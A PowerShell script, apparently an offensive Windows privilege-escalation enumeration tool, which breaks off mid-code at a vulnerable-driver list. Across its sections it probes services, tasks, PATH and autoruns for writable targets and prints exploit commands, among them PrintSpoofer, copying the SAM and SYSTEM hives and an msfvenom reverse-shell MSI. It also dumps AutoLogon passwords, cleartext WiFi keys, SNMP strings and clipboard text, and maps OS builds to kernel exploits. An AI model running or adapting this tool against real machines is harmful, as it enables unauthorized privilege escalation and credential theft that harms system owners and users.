<#
.SYNOPSIS
    Ultimate Windows Privilege Escalation Enumeration Tool
.DESCRIPTION
    Comprehensive enumeration covering 50+ privilege escalation vectors
    Includes EVERY known Windows privesc check
.NOTES
    For authorized security assessments only
    Version: 3.0 Ultimate
#>

param(
    [switch]$Verbose,
    [switch]$SaveReport,
    [string]$OutputPath = ".\PrivEscEnum_Report.txt"
)

function Write-Finding {
    param(
        [string]$Message,
        [string]$Level = "Info"
    )
    
    switch ($Level) {
        "Critical" { Write-Host "[!] $Message" -ForegroundColor Red }
        "High"     { Write-Host "[+] $Message" -ForegroundColor Yellow }
        "Medium"   { Write-Host "[*] $Message" -ForegroundColor Cyan }
        "Info"     { Write-Host "[i] $Message" -ForegroundColor White }
    }
    
    if ($SaveReport) {
        Add-Content -Path $OutputPath -Value "[$Level] $Message"
    }
}

function Write-SectionHeader {
    param([string]$Title)
    $separator = "=" * 80
    Write-Host "`n$separator" -ForegroundColor Green
    Write-Host $Title -ForegroundColor Green
    Write-Host "$separator`n" -ForegroundColor Green
    
    if ($SaveReport) {
        Add-Content -Path $OutputPath -Value "`n$separator`n$Title`n$separator`n"
    }
}

if ($SaveReport) {
    "Windows Privilege Escalation Enumeration Report - ULTIMATE EDITION" | Out-File -FilePath $OutputPath
    "Generated: $(Get-Date)" | Out-File -FilePath $OutputPath -Append
    "Host: $env:COMPUTERNAME" | Out-File -FilePath $OutputPath -Append
}

Write-Host "`n================================================================" -ForegroundColor Cyan
Write-Host "   ULTIMATE Windows Privilege Escalation Enumeration Tool" -ForegroundColor Cyan
Write-Host "   Complete Edition - 50+ Security Checks" -ForegroundColor Cyan
Write-Host "================================================================`n" -ForegroundColor Cyan

# ============================================================================
# SYSTEM INFORMATION
# ============================================================================
Write-SectionHeader "SYSTEM INFORMATION"

try {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    Write-Finding "OS: $($os.Caption) $($os.OSArchitecture)" "Info"
    Write-Finding "Version: $($os.Version)" "Info"
    Write-Finding "Build: $($os.BuildNumber)" "Info"
    Write-Finding "Hostname: $env:COMPUTERNAME" "Info"
    Write-Finding "Domain: $env:USERDOMAIN" "Info"
    
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    Write-Finding "Manufacturer: $($computerSystem.Manufacturer)" "Info"
    Write-Finding "Model: $($computerSystem.Model)" "Info"
    
    Write-Finding "`nChecking installed hotfixes..." "Info"
    $hotfixes = Get-HotFix | Select-Object -ExpandProperty HotFixID
    Write-Finding "Total Hotfixes: $($hotfixes.Count)" "Info"
    
    $lastBoot = $os.ConvertToDateTime($os.LastBootUpTime)
    Write-Finding "Last Boot: $lastBoot" "Info"
    
} catch {
    Write-Finding "Error gathering system information: $_" "High"
}

# ============================================================================
# CURRENT USER INFORMATION
# ============================================================================
Write-SectionHeader "CURRENT USER INFORMATION"

try {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Finding "Username: $($currentUser.Name)" "Info"
    Write-Finding "User SID: $($currentUser.User.Value)" "Info"
    
    Write-Finding "`nUser Privileges:" "Info"
    $privileges = whoami /priv
    $privileges | ForEach-Object { Write-Finding $_ "Info" }
    
    Write-Finding "`nGroup Memberships:" "Info"
    $groups = whoami /groups
    $groups | ForEach-Object { Write-Finding $_ "Info" }
    
    if ($privileges -match "SeImpersonatePrivilege.*Enabled") {
        Write-Finding "`nSeImpersonatePrivilege ENABLED - Token impersonation!" "Critical"
        Write-Finding "  Exploit: PrintSpoofer.exe -i -c cmd" "Critical"
        Write-Finding "  Tools: RoguePotato, GodPotato, JuicyPotato" "Critical"
    }
    if ($privileges -match "SeAssignPrimaryTokenPrivilege.*Enabled") {
        Write-Finding "SeAssignPrimaryTokenPrivilege ENABLED" "High"
    }
    if ($privileges -match "SeTcbPrivilege.*Enabled") {
        Write-Finding "SeTcbPrivilege ENABLED - Act as OS!" "Critical"
    }
    if ($privileges -match "SeDebugPrivilege.*Enabled") {
        Write-Finding "SeDebugPrivilege ENABLED - Process injection!" "High"
        Write-Finding "  Exploit: Inject into SYSTEM process" "High"
    }
    if ($privileges -match "SeBackupPrivilege.*Enabled") {
        Write-Finding "SeBackupPrivilege ENABLED - Read any file!" "High"
        Write-Finding "  Exploit: robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM" "High"
    }
    if ($privileges -match "SeRestorePrivilege.*Enabled") {
        Write-Finding "SeRestorePrivilege ENABLED - Write any file!" "High"
    }
    if ($privileges -match "SeTakeOwnershipPrivilege.*Enabled") {
        Write-Finding "SeTakeOwnershipPrivilege ENABLED" "High"
        Write-Finding "  Exploit: takeown /f file && icacls file /grant user:F" "High"
    }
    if ($privileges -match "SeLoadDriverPrivilege.*Enabled") {
        Write-Finding "SeLoadDriverPrivilege ENABLED - Load drivers!" "Critical"
        Write-Finding "  Exploit: Load vulnerable signed driver (Capcom.sys)" "Critical"
    }
    
} catch {
    Write-Finding "Error gathering user information: $_" "High"
}

# ============================================================================
# ALWAYSINSTALLELEVATED
# ============================================================================
Write-SectionHeader "ALWAYSINSTALLELEVATED CHECK"

try {
    $hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    $hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    
    if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
        Write-Finding "VULNERABLE! AlwaysInstallElevated enabled!" "Critical"
        Write-Finding "  Exploit: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi" "Critical"
        Write-Finding "  Then: msiexec /quiet /qn /i evil.msi" "Critical"
    } else {
        Write-Finding "AlwaysInstallElevated not enabled" "Info"
    }
} catch {
    Write-Finding "Could not check AlwaysInstallElevated" "Info"
}

# ============================================================================
# SERVICES ENUMERATION - COMPREHENSIVE
# ============================================================================
Write-SectionHeader "SERVICES - COMPREHENSIVE ANALYSIS"

try {
    Write-Finding "Performing deep service analysis..." "Info"
    
    $services = Get-WmiObject win32_service
    
    foreach ($service in $services) {
        # Unquoted service paths
        if ($service.PathName -match '^[^"].*\s.*') {
            Write-Finding "Unquoted Service Path: $($service.Name)" "High"
            Write-Finding "  Path: $($service.PathName)" "High"
            Write-Finding "  Exploit: Place exe in path before space" "High"
        }
        
        # Writable service binaries
        if ($service.PathName) {
            $binaryPath = $service.PathName -replace '"', '' -replace ' .*$', ''
            if (Test-Path $binaryPath -ErrorAction SilentlyContinue) {
                try {
                    $testFile = $binaryPath + ".test"
                    [System.IO.File]::Create($testFile).Close()
                    Remove-Item $testFile -ErrorAction SilentlyContinue
                    Write-Finding "Writable Service Binary: $($service.Name) - $binaryPath" "Critical"
                    Write-Finding "  Exploit: Replace with payload and restart service" "Critical"
                } catch {}
                
                # Check parent directory
                $parentDir = Split-Path $binaryPath -Parent
                if ($parentDir -and (Test-Path $parentDir)) {
                    try {
                        $testFile = Join-Path $parentDir "test.dll"
                        [System.IO.File]::Create($testFile).Close()
                        Remove-Item $testFile -ErrorAction SilentlyContinue
                        Write-Finding "Writable Service Directory: $($service.Name) - $parentDir" "High"
                        Write-Finding "  Exploit: DLL hijacking in service directory" "High"
                    } catch {}
                }
            }
        }
    }
    
    # Check service registry permissions
    Write-Finding "`nChecking service registry keys..." "Info"
    $serviceRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services"
    
    if (Test-Path $serviceRegPath) {
        Get-ChildItem $serviceRegPath -ErrorAction SilentlyContinue | Select-Object -First 50 | ForEach-Object {
            $serviceName = $_.PSChildName
            try {
                # Try to create a test value
                New-ItemProperty -Path $_.PSPath -Name "TestPermission" -Value "test" -ErrorAction Stop | Out-Null
                Remove-ItemProperty -Path $_.PSPath -Name "TestPermission" -ErrorAction SilentlyContinue
                Write-Finding "WRITABLE Service Registry: $serviceName" "Critical"
                Write-Finding "  Exploit: Modify ImagePath to point to payload" "Critical"
            } catch {}
        }
    }
    
    # Check for service DLLs
    Write-Finding "`nChecking service DLL opportunities..." "Info"
    foreach ($service in ($services | Select-Object -First 30)) {
        $serviceName = $service.Name
        $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName\Parameters"
        
        if (Test-Path $regPath) {
            $params = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
            if ($params.ServiceDll) {
                $dllPath = $params.ServiceDll
                $dllDir = Split-Path $dllPath -Parent
                
                if ($dllDir -and (Test-Path $dllDir -ErrorAction SilentlyContinue)) {
                    try {
                        $testFile = Join-Path $dllDir "test.dll"
                        [System.IO.File]::Create($testFile).Close()
                        Remove-Item $testFile -ErrorAction SilentlyContinue
                        Write-Finding "Writable Service DLL Directory: $serviceName - $dllDir" "Critical"
                    } catch {}
                }
            }
        }
    }
    
    # Check service failure actions
    Write-Finding "`nChecking service failure actions..." "Info"
    foreach ($service in ($services | Where-Object {$_.StartMode -eq "Auto"} | Select-Object -First 20)) {
        try {
            $failureActions = sc.exe qfailure $($service.Name) 2>$null
            if ($failureActions -match "COMMAND_LINE.*\.exe") {
                $commandLine = ($failureActions | Select-String "COMMAND_LINE").ToString()
                Write-Finding "Service with failure command: $($service.Name)" "Medium"
                Write-Finding "  Command: $commandLine" "Medium"
            }
        } catch {}
    }
    
} catch {
    Write-Finding "Error in service enumeration: $_" "High"
}

# ============================================================================
# SCHEDULED TASKS
# ============================================================================
Write-SectionHeader "SCHEDULED TASKS"

try {
    Write-Finding "Checking scheduled tasks..." "Info"
    
    $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {$_.State -eq "Ready"}
    
    foreach ($task in $tasks) {
        if ($task.Principal.UserId -match "SYSTEM") {
            $actions = $task.Actions
            foreach ($action in $actions) {
                if ($action.Execute) {
                    $execPath = $action.Execute
                    if (Test-Path $execPath -ErrorAction SilentlyContinue) {
                        try {
                            $testFile = $execPath + ".test"
                            [System.IO.File]::Create($testFile).Close()
                            Remove-Item $testFile -ErrorAction SilentlyContinue
                            Write-Finding "Writable SYSTEM Task: $($task.TaskName)" "Critical"
                            Write-Finding "  Path: $execPath" "Critical"
                            Write-Finding "  Exploit: Replace executable and wait for trigger" "Critical"
                        } catch {}
                    }
                }
            }
        }
    }
} catch {
    Write-Finding "Error checking scheduled tasks: $_" "High"
}

# ============================================================================
# PATH ANALYSIS
# ============================================================================
Write-SectionHeader "PATH ANALYSIS - DLL HIJACKING"

try {
    $pathDirs = $env:PATH -split ";"
    
    Write-Finding "Checking PATH for writable directories..." "Info"
    foreach ($dir in $pathDirs) {
        if ($dir -and (Test-Path $dir -ErrorAction SilentlyContinue)) {
            try {
                $testFile = Join-Path $dir "test.dll"
                [System.IO.File]::Create($testFile).Close()
                Remove-Item $testFile -ErrorAction SilentlyContinue
                Write-Finding "Writable PATH directory: $dir" "High"
                Write-Finding "  Exploit: Place malicious DLL with common name (version.dll, dwmapi.dll)" "High"
            } catch {}
        }
    }
    
    # Check if current directory is in PATH
    if ($env:PATH -match "^\.;|;\.;|;\.$") {
        Write-Finding "Current directory (.) in PATH - CRITICAL DLL hijacking!" "Critical"
    }
    
    # Check Program Files for writable directories
    Write-Finding "`nChecking Program Files for writable directories..." "Info"
    $programDirs = @("C:\Program Files", "C:\Program Files (x86)")
    
    foreach ($baseDir in $programDirs) {
        if (Test-Path $baseDir) {
            Get-ChildItem $baseDir -Directory -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object {
                try {
                    $testFile = Join-Path $_.FullName "test.dll"
                    [System.IO.File]::Create($testFile).Close()
                    Remove-Item $testFile -ErrorAction SilentlyContinue
                    Write-Finding "Writable Program Directory: $($_.FullName)" "High"
                    Write-Finding "  Exploit: DLL hijacking for applications in this directory" "High"
                } catch {}
            }
        }
    }
    
} catch {
    Write-Finding "Error checking PATH: $_" "High"
}

# ============================================================================
# AUTORUN ENTRIES
# ============================================================================
Write-SectionHeader "AUTORUN AND PERSISTENCE"

try {
    Write-Finding "Checking autorun locations..." "Info"
    
    $autorunKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    )
    
    foreach ($key in $autorunKeys) {
        if (Test-Path $key) {
            $entries = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
            if ($entries) {
                Write-Finding "`nAutorun entries in $key" "Info"
                $entries.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
                    Write-Finding "$($_.Name): $($_.Value)" "Medium"
                    
                    $filePath = $_.Value -replace '"', '' -replace ' .*$', ''
                    if (Test-Path $filePath -ErrorAction SilentlyContinue) {
                        try {
                            $testFile = $filePath + ".test"
                            [System.IO.File]::Create($testFile).Close()
                            Remove-Item $testFile -ErrorAction SilentlyContinue
                            Write-Finding "  ^-- WRITABLE! Can replace with payload" "Critical"
                        } catch {}
                    }
                }
            }
        }
    }
    
    # Check shell folder manipulation
    Write-Finding "`nChecking shell folders..." "Info"
    $shellFolders = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -ErrorAction SilentlyContinue
    if ($shellFolders.Startup -notmatch "^%USERPROFILE%") {
        Write-Finding "Custom Startup folder location detected: $($shellFolders.Startup)" "Medium"
    }
    
} catch {
    Write-Finding "Error checking autorun: $_" "High"
}

# ============================================================================
# STARTUP FOLDERS
# ============================================================================
Write-SectionHeader "STARTUP FOLDERS"

try {
    $startupFolders = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
        "$env:USERPROFILE\Start Menu\Programs\Startup"
    )
    
    foreach ($folder in $startupFolders) {
        if (Test-Path $folder) {
            Write-Finding "`nStartup Folder: $folder" "Info"
            
            $items = Get-ChildItem $folder -ErrorAction SilentlyContinue
            foreach ($item in $items) {
                Write-Finding "  Contains: $($item.Name)" "Medium"
            }
            
            try {
                $testFile = Join-Path $folder "test.exe"
                [System.IO.File]::Create($testFile).Close()
                Remove-Item $testFile -ErrorAction SilentlyContinue
                Write-Finding "  ^-- WRITABLE startup folder!" "Critical"
                Write-Finding "  Exploit: Drop payload here for persistence" "Critical"
            } catch {}
        }
    }
    
} catch {
    Write-Finding "Error checking startup folders: $_" "High"
}

# ============================================================================
# CREDENTIAL HUNTING - COMPREHENSIVE
# ============================================================================
Write-SectionHeader "CREDENTIAL HUNTING - COMPREHENSIVE"

try {
    Write-Finding "Comprehensive credential search..." "Info"
    
    # Unattend files
    Write-Finding "`nUnattend.xml files:" "Info"
    $unattendPaths = @(
        "$env:USERPROFILE\Unattend.xml",
        "C:\Unattend.xml",
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\Unattend\Unattend.xml",
        "C:\Windows\System32\sysprep\unattend.xml",
        "C:\Windows\System32\sysprep\sysprep.xml"
    )
    
    foreach ($file in $unattendPaths) {
        if (Test-Path $file -ErrorAction SilentlyContinue) {
            Write-Finding "Found: $file" "High"
        }
    }
    
    # PowerShell history
    $psHistory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $psHistory) {
        Write-Finding "`nPowerShell history found: $psHistory" "High"
        $historyContent = Get-Content $psHistory -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass|key|secret" -SimpleMatch
        if ($historyContent) {
            Write-Finding "  Contains potential credentials!" "High"
        }
    }
    
    # Registry credentials
    Write-Finding "`nRegistry credential check:" "Info"
    
    # AutoLogon
    $winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
    if ($winlogon.DefaultUserName) {
        Write-Finding "AutoLogon User: $($winlogon.DefaultUserName)" "High"
        if ($winlogon.DefaultPassword) {
            Write-Finding "  Password: $($winlogon.DefaultPassword)" "Critical"
        }
    }
    
    # SNMP
    $snmpParams = "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"
    if (Test-Path $snmpParams) {
        Write-Finding "SNMP community strings found in registry" "High"
        Get-ItemProperty $snmpParams -ErrorAction SilentlyContinue | ForEach-Object {
            $_.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
                Write-Finding "  Community: $($_.Name)" "High"
            }
        }
    }
    
    # VNC
    $vncKeys = @(
        "HKCU:\Software\ORL\WinVNC3\Password",
        "HKCU:\Software\RealVNC\WinVNC4",
        "HKLM:\SOFTWARE\RealVNC\WinVNC4"
    )
    foreach ($key in $vncKeys) {
        if (Test-Path $key -ErrorAction SilentlyContinue) {
            Write-Finding "VNC password key: $key" "High"
        }
    }
    
    # PuTTY
    $puttyPath = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
    if (Test-Path $puttyPath) {
        Write-Finding "`nPuTTY sessions found" "High"
        Get-ChildItem $puttyPath -ErrorAction SilentlyContinue | ForEach-Object {
            $session = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            Write-Finding "  Session: $($_.PSChildName)" "Medium"
            if ($session.HostName) {
                Write-Finding "    Host: $($session.HostName)" "Medium"
            }
            if ($session.UserName) {
                Write-Finding "    User: $($session.UserName)" "Medium"
            }
        }
    }
    
    # WiFi Passwords
    Write-Finding "`nWiFi passwords:" "Info"
    try {
        $wifiProfiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object {
            $_ -replace ".*:\s+"
        }
        
        foreach ($profile in $wifiProfiles) {
            $profileInfo = netsh wlan show profile name="$profile" key=clear 2>$null
            $password = $profileInfo | Select-String "Key Content" | ForEach-Object {
                $_ -replace ".*:\s+"
            }
            if ($password) {
                Write-Finding "WiFi '$profile' = $password" "High"
            }
        }
    } catch {}
    
    # IIS
    Write-Finding "`nIIS configuration:" "Info"
    $iisConfig = "C:\Windows\System32\inetsrv\config\applicationHost.config"
    if (Test-Path $iisConfig) {
        Write-Finding "IIS config found: $iisConfig" "High"
        $iisContent = Get-Content $iisConfig -ErrorAction SilentlyContinue | Select-String -Pattern "password|connectionString"
        if ($iisContent) {
            Write-Finding "  Contains connection strings/passwords!" "Critical"
        }
    }
    
    # Web.config files
    Write-Finding "`nWeb.config files:" "Info"
    if (Test-Path "C:\inetpub") {
        Get-ChildItem "C:\inetpub" -Filter "web.config" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {
            Write-Finding "Found: $($_.FullName)" "High"
            $content = Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString|password"
            if ($content) {
                Write-Finding "  Contains credentials!" "High"
            }
        }
    }
    
    # Database connection files
    Write-Finding "`nDatabase connection files:" "Info"
    $dbExtensions = @("*.udl", "*.dsn")
    foreach ($ext in $dbExtensions) {
        Get-ChildItem "C:\" -Filter $ext -Recurse -ErrorAction SilentlyContinue -Depth 2 | Select-Object -First 5 | ForEach-Object {
            Write-Finding "Found: $($_.FullName)" "High"
        }
    }
    
    # Config files with passwords
    Write-Finding "`nSearching config files for passwords..." "Info"
    $searchPaths = @("$env:USERPROFILE", "C:\inetpub", "C:\xampp", "C:\wamp")
    foreach ($path in $searchPaths) {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            Get-ChildItem $path -Include "*.config","*.ini","*.xml" -Recurse -ErrorAction SilentlyContinue -Depth 2 | 
                Where-Object {$_.Length -lt 1MB} | 
                Select-Object -First 10 | 
                ForEach-Object {
                    $content = Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass" -SimpleMatch
                    if ($content) {
                        Write-Finding "Credentials in: $($_.FullName)" "High"
                    }
                }
        }
    }
    
} catch {
    Write-Finding "Error in credential hunting: $_" "High"
}

# ============================================================================
# BROWSER CREDENTIALS
# ============================================================================
Write-SectionHeader "BROWSER CREDENTIALS"

try {
    Write-Finding "Checking browsers..." "Info"
    
    # Chrome
    $chromePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    )
    
    foreach ($path in $chromePaths) {
        if (Test-Path $path) {
            Write-Finding "Chrome: $path" "High"
        }
    }
    
    # Firefox
    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfiles) {
        Write-Finding "`nFirefox profiles found" "High"
        Get-ChildItem $firefoxProfiles -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $loginJson = Join-Path $_.FullName "logins.json"
            $key4db = Join-Path $_.FullName "key4.db"
            $cookies = Join-Path $_.FullName "cookies.sqlite"
            
            if (Test-Path $loginJson) { Write-Finding "  logins.json: $loginJson" "High" }
            if (Test-Path $key4db) { Write-Finding "  key4.db: $key4db" "High" }
            if (Test-Path $cookies) { Write-Finding "  cookies: $cookies" "High" }
        }
    }
    
    # Edge
    $edgePaths = @(
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
    )
    
    foreach ($path in $edgePaths) {
        if (Test-Path $path) {
            Write-Finding "Edge: $path" "High"
        }
    }
    
    Write-Finding "`nUse SharpChrome, LaZagne, or similar tools to decrypt" "Info"
    
} catch {
    Write-Finding "Error checking browsers: $_" "High"
}

# ============================================================================
# CLIPBOARD AND RECENT FILES
# ============================================================================
Write-SectionHeader "CLIPBOARD AND RECENT ACTIVITY"

try {
    # Clipboard
    Write-Finding "Checking clipboard..." "Info"
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
        $clipboard = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipboard) {
            $preview = $clipboard.Substring(0, [Math]::Min(200, $clipboard.Length))
            Write-Finding "Clipboard content (first 200 chars): $preview" "Medium"
        }
    } catch {}
    
    # Recent documents
    Write-Finding "`nRecent documents:" "Info"
    $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
    if (Test-Path $recentPath) {
        $recentItems = Get-ChildItem $recentPath -ErrorAction SilentlyContinue | Select-Object -First 20
        Write-Finding "Recent items: $($recentItems.Count)" "Info"
        $recentItems | ForEach-Object {
            if ($_.Extension -eq ".lnk") {
                Write-Finding "  $($_.Name)" "Info"
            }
        }
    }
    
    # Jump lists
    $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
    if (Test-Path $jumpListPath) {
        $jumpLists = Get-ChildItem $jumpListPath -ErrorAction SilentlyContinue
        Write-Finding "`nJump list files: $($jumpLists.Count)" "Medium"
    }
    
    # Office recent files
    $officeRecent = "$env:APPDATA\Microsoft\Office\Recent"
    if (Test-Path $officeRecent) {
        $officeFiles = Get-ChildItem $officeRecent -ErrorAction SilentlyContinue
        if ($officeFiles) {
            Write-Finding "Office recent files: $($officeFiles.Count)" "Info"
        }
    }
    
    # Recycle Bin
    Write-Finding "`nRecycle Bin:" "Info"
    $recycleBin = Get-ChildItem 'C:\$Recycle.Bin' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20
    if ($recycleBin) {
        Write-Finding "Items in Recycle Bin: $($recycleBin.Count)" "Medium"
    }
    
} catch {
    Write-Finding "Error checking clipboard/recent: $_" "High"
}

# ============================================================================
# PROCESS ENUMERATION
# ============================================================================
Write-SectionHeader "PROCESS ENUMERATION"

try {
    Write-Finding "Enumerating processes..." "Info"
    
    $processes = Get-WmiObject Win32_Process
    
    # SYSTEM processes
    Write-Finding "`nSYSTEM processes:" "Info"
    $systemProcs = $processes | Where-Object {
        $owner = $_.GetOwner()
        $owner.User -eq "SYSTEM"
    } | Select-Object ProcessId,Name,CommandLine -First 25
    
    foreach ($proc in $systemProcs) {
        Write-Finding "  PID $($proc.ProcessId): $($proc.Name)" "Medium"
    }
    
    # Unquoted process paths
    Write-Finding "`nProcesses with unquoted paths:" "Info"
    $processes | Where-Object {
        $_.ExecutablePath -and $_.ExecutablePath -match '^\w:\\[^"]*\s.*\.exe' -and $_.ExecutablePath -notmatch '^"'
    } | Select-Object -First 10 | ForEach-Object {
        Write-Finding "  PID $($_.ProcessId): $($_.Name) - $($_.ExecutablePath)" "High"
    }
    
    # Interesting processes
    $interestingProcs = @("sql", "postgres", "mysql", "oracle", "mongo", "redis")
    foreach ($keyword in $interestingProcs) {
        $found = $processes | Where-Object {$_.Name -like "*$keyword*"}
        if ($found) {
            Write-Finding "`nDatabase process: $($found.Name)" "Medium"
        }
    }
    
} catch {
    Write-Finding "Error enumerating processes: $_" "High"
}

# ============================================================================
# KERNEL EXPLOIT DETECTION
# ============================================================================
Write-SectionHeader "KERNEL EXPLOIT DETECTION"

try {
    $buildNumber = (Get-WmiObject Win32_OperatingSystem).BuildNumber
    Write-Finding "OS Build: $buildNumber" "Info"
    
    $exploits = @{
        "7600" = @("MS10-015", "MS10-092", "MS11-011", "MS11-046")
        "7601" = @("MS11-046", "MS11-080", "MS13-005", "MS13-053", "MS13-081", "MS14-058", "MS15-051", "MS16-014", "MS16-032")
        "9200" = @("MS13-053", "MS13-081", "MS14-058", "MS15-051", "MS16-014", "MS16-032")
        "9600" = @("MS14-058", "MS15-051", "MS16-014", "MS16-032", "MS16-034", "MS16-135")
        "10240" = @("MS16-032", "MS16-034", "MS16-135")
        "10586" = @("MS16-032", "MS16-034", "MS16-135")
        "14393" = @("MS16-135", "CVE-2017-0213")
        "15063" = @("CVE-2017-0213")
        "16299" = @("CVE-2018-0743", "CVE-2018-8120")
        "17134" = @("CVE-2018-8440", "CVE-2018-8611")
        "17763" = @("CVE-2019-0841", "CVE-2019-1064", "CVE-2019-1130")
        "18362" = @("CVE-2019-1064", "CVE-2019-1130", "CVE-2019-1253", "CVE-2019-1315")
        "18363" = @("CVE-2019-1253", "CVE-2019-1315", "CVE-2020-0668", "CVE-2020-0683")
        "19041" = @("CVE-2020-0668", "CVE-2020-0683", "CVE-2020-1054")
        "19042" = @("CVE-2020-1054", "CVE-2021-1732")
        "19043" = @("CVE-2021-1732")
        "19044" = @("CVE-2021-1732")
        "22000" = @("CVE-2021-36934 (HiveNightmare/SeriousSAM)")
        "22621" = @("Check latest CVEs")
    }
    
    if ($exploits.ContainsKey($buildNumber)) {
        Write-Finding "`nPotentially vulnerable to:" "Critical"
        foreach ($exploit in $exploits[$buildNumber]) {
            Write-Finding "  - $exploit" "Critical"
        }
        Write-Finding "`nSearch exploit-db.com or GitHub for compiled exploits" "Critical"
    } else {
        Write-Finding "Build not in database (patched or too new)" "Info"
    }
    
    # Check specific patches
    Write-Finding "`nChecking critical patches..." "Info"
    $criticalPatches = @("KB2503665", "KB3139914", "KB2592799")
    $installedHotfixes = Get-HotFix | Select-Object -ExpandProperty HotFixID
    
    foreach ($patch in $criticalPatches) {
        if ($installedHotfixes -notcontains $patch) {
            Write-Finding "Critical patch $patch NOT installed!" "High"
        }
    }
    
} catch {
    Write-Finding "Error checking kernel exploits: $_" "High"
}

# ============================================================================
# NAMED PIPES
# ============================================================================
Write-SectionHeader "NAMED PIPES"

try {
    Write-Finding "Enumerating named pipes..." "Info"
    
    $pipes = [System.IO.Directory]::GetFiles("\\.\\pipe\\")
    Write-Finding "Total pipes: $($pipes.Count)" "Info"
    
    $interestingPipes = @("lsass", "sam", "winreg", "spoolss", "srvsvc", "ntsvcs", "scerpc", "wkssvc")
    
    Write-Finding "`nInteresting pipes:" "Info"
    foreach ($pipe in $pipes) {
        $pipeName = [System.IO.Path]::GetFileName($pipe)
        foreach ($interesting in $interestingPipes) {
            if ($pipeName -like "*$interesting*") {
                Write-Finding "  $pipeName" "Medium"
            }
        }
    }
    
    Write-Finding "`nUse accesschk or PipeList for detailed ACL analysis" "Info"
    
} catch {
    Write-Finding "Error enumerating pipes: $_" "High"
}

# ============================================================================
# DRIVER ENUMERATION
# ============================================================================
Write-SectionHeader "DRIVER ENUMERATION"

try {
    Write-Finding "Checking drivers..." "Info"
    
    try {
        $drivers = Get-WindowsDriver -Online -All -ErrorAction Stop
        Write-Finding "Total drivers: $($drivers.Count)" "Info"
        
        # Third-party drivers
        $thirdParty = $drivers | Where-Object {$_.ProviderName -notmatch "Microsoft"} | Select-Object -First 20
        Write-Finding "`nThird-party drivers:" "Info"
        foreach ($driver in $thirdParty) {
            Write-Finding "  $($driver.Driver) - $($driver.ProviderName)" "Medium"
        }
    } catch {
        Write-Finding "Could not enumerate with Get-WindowsDriver" "Info"
    }
    
    # Check using driverquery
    $drivers = driverquery /v /fo csv | ConvertFrom-Csv
    
    # Unsigned drivers
    $unsigned = $drivers | Where-Object {$_.Signed -eq "False"}
    if ($unsigned) {
        Write-Finding "`nUnsigned drivers:" "High"
        $unsigned | Select-Object -First 10 | ForEach-Object {
            Write-Finding "  $($_.'Module Name') - $($_.'Display Name')" "High"
        }
    }
    
    # Known vulnerable drivers (BYOVD - Bring Your Own Vulnerable Driver)
    $vulnDrivers = @(
        "rtcore64.sys", "gdrv.sys", "atillk64.sys", "cpuz141", 
        "asmmap64.sys", "capcom.sys", "dbutil_2_3.sys"
    )
    
